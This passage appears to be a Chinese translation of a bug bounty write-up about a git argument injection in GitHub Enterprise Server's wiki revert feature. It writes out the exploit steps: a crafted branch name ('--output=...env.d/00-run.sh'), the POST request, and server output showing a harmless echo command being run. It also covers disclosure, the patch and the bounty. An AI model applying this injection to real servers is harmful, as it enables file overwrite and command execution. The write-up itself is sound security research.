    +2
下一步要做的是想出如何用“写文件”做点什么。可以将该文件写入`git`用户可以访问的任何地方，并且文件末尾的内容是可控的(fairly
controllable)。  
经过更多的搜索，我发现了一些可写的`env.d`目录（如`/data/github/shared/env.d`），这些目录中包含了一些"安装脚本"(setup
scripts)，这些目录中的文件最终会在服务启动、或运行某些命令的时候，被引用(being sourced)：
    for i in $envdir/*.sh; do
        if [ -r $i ]; then
          . $i
        fi
      done
因为使用`. script.sh`这种方式执行脚本，是不需要将该文件为可执行的(executable)，即无需 +x 就能执行成功。  
原理: 将script-name中的内容直接加载到当前的shell。
而且我们知道，bash在遇到错误后将继续运行脚本。  
这意味着，如果写入的diff包含一些有效的shell脚本，那么它将被执行!
  * 所以现在万事俱备，有了利用这个漏洞所需要的所有东西：
    * 1.从数据库中获取一个CSRF token. (Grab a users CSRF token from the database.)
    * 2.创建一个wiki页面 其中包含了 `; echo vakzz was here > /tmp/ggg`
    * 3.编辑wiki页面，并增加一行新文本：`#anything`
    * 4.克隆 wiki 仓库 (Clone the wiki repo.)
    * 5.push一个新的分支的名称，用我们注入进去的flag (Push a new branch name with our injected flag): `git push origin master:--output=/data/failbotd/shared/env.d/00-run.sh`
    * 6.用burp或curl，将从数据库中拿到的`authenticity_token`，发送POST请求到`user/repo/wiki/Home/_revert/HEAD/--output%3D%2Fdata%2Ffailbotd%2Fshared%2Fenv%2Ed%2F00-run%2Esh`
如
    POST /user/repo/wiki/Home/_revert/HEAD/--output%3D%2Fdata%2Ffailbotd%2Fshared%2Fenv%2Ed%2F00-run%2Esh HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Cookie: user_session=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    Content-Length: 65
    authenticity_token=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3d
  * 7.检查服务器，查看文件是否已通过我们的`diff`创建成功了：
        $ cat /data/failbotd/shared/env.d/00-run.sh
    69eb12b5e9969ec73a9e01a67555c089bcf0fc36
    diff --git b/Home.md a/Home.md
    index 4a7b77c..ce38b05 100644
    --- b/Home.md
    +++ a/Home.md
    @@ -1,2 +1 @@
    -; echo vakzz was here > /tmp/ggg`
    -# anything
    \ No newline at end of file
    +; echo vakzz was here > /tmp/ggg`
    \ No newline at end of file
  * 8.运行引用我们的diff的文件， 并检查shell命令`echo vakzz was here > /tmp/ggg`是否执行成功了:  
Run the file that sources our diff and check it worked.
        ./production.sh
    ./production.sh: 1: /data/failbotd/current/.app-config/env.d/00-run.sh: 69eb12b5e9969ec73a9e01a67555c089bcf0fc36: not found
    diff: unrecognized option '--git'
    diff: Try 'diff --help' for more information.
    ./production.sh: 3: /data/failbotd/current/.app-config/env.d/00-run.sh: index: not found
    ./production.sh: 4: /data/failbotd/current/.app-config/env.d/00-run.sh: ---: not found
    ./production.sh: 5: /data/failbotd/current/.app-config/env.d/00-run.sh: +++: not found
    ./production.sh: 6: /data/failbotd/current/.app-config/env.d/00-run.sh: @@: not found
    ./production.sh: 7: /data/failbotd/current/.app-config/env.d/00-run.sh: -: not found
    ./production.sh: 2: /data/failbotd/current/.app-config/env.d/00-run.sh: -#: not found
    ./production.sh: 3: /data/failbotd/current/.app-config/env.d/00-run.sh:  No: not found
    ./production.sh: 4: /data/failbotd/current/.app-config/env.d/00-run.sh: +: not found
    ./production.sh: 11: /data/failbotd/current/.app-config/env.d/00-run.sh:  No: not found
    $ cat /tmp/ggg
    vakzz was here
确认漏洞存在。
我决定向GitHub报告这个问题，尽管这个漏洞有前提（需要绕过CSRF防御）。  
虽然我没有办法绕过每个表单的CSRF token，我仍然决定将问题报告给 GitHub。
底层的问题(The underlying issue)仍然很严重，GitHub可能会在未来发布一个patch，如果不小心泄露了全局令牌(global
token)，或者改变了接受查询参数的路由，这将使它们容易受到攻击(vulnerable)。
不到15分钟，GitHub就对bug进行了分类，并告诉我他们正在调查。几个小时后，他们再次回复：确认了底层的问题，虽然他们也无法找到“绕过每个表单的token的方法”。仍然确认这是一个严重的问题（他们可能对CSRF设置感到很幸运，否则这个漏洞就严重了）。
我发送了一份我试图绕过每个form的方法的总结，以及可能会泄漏它的潜在的点，并确认了我认为它基本不可能被利用。
所以，这个bug本身是严重的，但是没有办法利用这个漏洞。我真的不知道GitHub会不会给赏金，最后GitHub的赏金让我感到非常惊喜。
### Timeline
July 25, 2020 01:48:02 AEST - Bug submitted. H1
July 25, 2020 02:05:21 AEST - Bug was triaged by GitHub
July 25, 2020 09:18:28 AEST - Underlying issue was confirmed
August 11, 2020 - GitHub Enterprise 2.21.4 released fixing the issue
High: An attacker could inject a malicious argument into a Git sub-command
when executed on GitHub Enterprise Server. This could allow an attacker to
overwrite arbitrary files with partially user-controlled content and
potentially execute arbitrary commands on the GitHub Enterprise Server
instance. To exploit this vulnerability, an attacker would need permission to
access repositories within the GHES instance. However, due to other
protections in place, we could not identify a way to actively exploit this
vulnerability. This vulnerability was reported through the GitHub Security Bug
Bounty program.
High: 攻击者在GitHub Enterprise
Server上执行Git子命令时，可以向其注入恶意参数。这可能允许攻击者用部分用户控制的内容覆盖任意文件，并可能在GitHub企业服务器实例上执行任意命令。要利用这个漏洞，攻击者需要获得访问GHES实例中的存储库的权限。然而，由于存在其他保护措施，我们无法确定积极利用此漏洞的方法。  
这个漏洞是通过GitHub安全漏洞奖励计划报告的。
September 11, 2020 02:52:15 AEST - $20,000 bounty awarded
### 参考资料
  * 原作者vakzz的博客 
  * 历史漏洞 
感谢 arr0w1 对本文要点分析的大力支持！